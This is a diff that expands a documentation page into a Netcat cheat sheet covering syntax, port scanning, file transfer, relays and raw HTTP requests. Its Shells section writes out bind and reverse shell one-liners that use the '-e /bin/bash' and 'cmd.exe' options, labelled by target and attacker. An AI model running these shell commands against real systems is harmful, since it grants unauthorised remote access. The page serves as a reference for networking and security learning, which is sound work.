@@ -1,11 +1,191 @@
 ---
 title: Netcat
-description: Netcat is a tool that allows you to connect to a network and send and receive data.
+description: A comprehensive guide to the Swiss Army Knife of networking tools
 icon: "GlobeLock"
 ---
 
-# Netcat
+import { Tab, Tabs } from 'fumadocs-ui/components/tabs';
+import { Step, Steps } from 'fumadocs-ui/components/steps';
+import { Accordion, Accordions } from 'fumadocs-ui/components/accordion';
 
-Netcat is a tool that allows you to connect to a network and send and receive data.
+# Netcat (nc) Cheatsheet
 
-## What is Netcat?
+<Callout title="What is Netcat?" type="info">
+  Netcat (nc) is often called the "Swiss Army Knife" of networking tools. It's a versatile utility that reads and writes data across network connections using TCP or UDP protocols. It's invaluable for network debugging, port scanning, data transfer, and even as a backdoor.
+</Callout>
+
+## 1. Basic Usage
+
+<Tabs items={["Syntax", "Common Flags", "Basic Operations", "Port Scanning"]}>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-blue-600 dark:text-blue-400">Basic Syntax</h4>
+      
+      ```bash
+      # Client Mode (Default)
+      nc [options] [hostname] [port]
+
+      # Server/Listener Mode
+      nc -l [options] [hostname] [port]
+      ```
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-green-600 dark:text-green-400">Common Flags</h4>
+      
+      ```bash
+      -l          # Listen mode
+      -v          # Verbose output
+      -vv         # Very verbose output
+      -n          # Skip DNS lookups
+      -p          # Specify source port
+      -u          # Use UDP instead of TCP
+      -w          # Timeout for connects
+      -z          # Zero-I/O mode (scanning)
+      -k          # Keep listening after client disconnects
+      ```
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-purple-600 dark:text-purple-400">Basic Operations</h4>
+      
+      ```bash
+      # Simple Chat Server
+      nc -l -p 1234        # Listener
+      nc localhost 1234    # Client
+
+      # File Transfer
+      nc -l -p 1234 > file.txt    # Receiver
+      nc host 1234 < file.txt     # Sender
+
+      # Banner Grabbing
+      nc -v host 80
+      ```
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-red-600 dark:text-red-400">Port Scanning</h4>
+      
+      ```bash
+      # Single Port
+      nc -zv host 80
+
+      # Port Range
+      nc -zv host 20-25
+
+      # Multiple Ports
+      nc -zv host 22 80 443
+
+      # With Timeout
+      nc -zvw3 host 20-25
+      ```
+    </div>
+  </Tab>
+</Tabs>
+
+## 2. Advanced Usage
+
+<Tabs items={["File Transfer", "Shells", "Relays", "HTTP"]}>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-blue-600 dark:text-blue-400">File Transfer</h4>
+      
+      ```bash
+      # Transfer Directory
+      # Receiver
+      nc -l -p 1234 | tar xvf -
+
+      # Sender
+      tar cf - directory | nc host 1234
+
+      # With Progress Bar
+      # Receiver
+      nc -l -p 1234 | pv > file.txt
+
+      # Sender
+      pv file.txt | nc host 1234
+      ```
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-green-600 dark:text-green-400">Shell Operations</h4>
+      
+      ```bash
+      # Bind Shell (Linux)
+      nc -l -p 1234 -e /bin/bash    # Target
+      nc host 1234                   # Attacker
+
+      # Bind Shell (Windows)
+      nc -l -p 1234 -e cmd.exe      # Target
+      nc host 1234                   # Attacker
+
+      # Reverse Shell (Linux)
+      nc -l -p 1234                  # Attacker
+      nc host 1234 -e /bin/bash     # Target
+      ```
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-purple-600 dark:text-purple-400">Port Forwarding/Relays</h4>
+      
+      ```bash
+      # Linux Relay (using named pipe)
+      mkfifo /tmp/pipe
+      nc -l -p 1234 < /tmp/pipe | nc host 80 > /tmp/pipe
+
+      # Windows Relay
+      nc -l -p 1234 -e "nc host 80"
+
+      # Port Forwarding
+      nc -l -p 8080 -c "nc localhost 80"
+      ```
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-red-600 dark:text-red-400">HTTP Operations</h4>
+      
+      ```bash
+      # Basic HTTP Server
+      while true; do nc -l -p 80 < index.html; done
+
+      # HTTP Request
+      printf "GET / HTTP/1.0\r\n\r\n" | nc host 80
+
+      # POST Request
+      printf "POST / HTTP/1.0\r\nContent-Length: 5\r\n\r\nHello" | nc host 80
+      ```
+    </div>
+  </Tab>
+</Tabs>
+
+## 3. Security Considerations
+
+<Callout type="warning">
+  - Always use Netcat in trusted networks or through VPN
+  - Be cautious with `-e` flag as it can create security vulnerabilities
+  - Consider using encrypted alternatives like `ncat` for sensitive data
+  - Monitor and log Netcat usage in production environments
+</Callout>
+
+## 4. Best Practices
+
+<Steps>
+  1. Always use verbose mode (`-v`) for debugging
+  2. Set appropriate timeouts with `-w` flag
+  3. Use `-n` flag when DNS resolution isn't needed
+</Steps>
+
+## Sources
+
+1. [Original Netcat documentation](http://nc110.sourceforge.net/) by *Hobbit*
+2. [SANS Institute - Netcat Cheat Sheet](https://www.sans.org/posters/netcat-cheat-sheet/)
+3. [Red Hat Security Blog - Netcat Usage Guide](https://www.redhat.com/sysadmin/getting-started-netcat)
+4. [Network Security Tools - Netcat Chapter](https://www.oreilly.com/library/view/network-security-tools/0596007949/ch04.html)
+5. [Varonis - Comprehensive Netcat Commands Guide](https://www.varonis.com/blog/netcat-commands#additional-netcat-resources)
+6. [GitHub Gist - Netcat Commands Collection](https://gist.github.com/cmbaughman/c91f41ba7b2cf71106f1)
